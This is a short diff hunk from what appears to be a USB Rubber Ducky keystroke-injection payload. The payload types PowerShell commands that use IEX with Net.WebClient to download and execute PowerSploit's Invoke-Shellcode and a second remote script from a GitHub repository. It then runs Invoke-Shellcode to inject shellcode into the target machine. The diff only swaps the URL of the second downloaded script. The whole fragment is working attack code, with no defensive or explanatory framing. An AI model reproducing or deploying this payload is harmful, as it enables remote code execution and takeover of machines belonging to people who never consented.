@@ -13,7 +13,7 @@ DELAY 1000
 STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')
 ENTER 
 DELAY 1000
-STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ceasar742/kell/master/transfer.pdf')
+STRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ceasar742/transfer/master/transfer.txt')
 ENTER
 DELAY 1000
 STRING Invoke-Shellcode -Shellcode ($buf) -Force
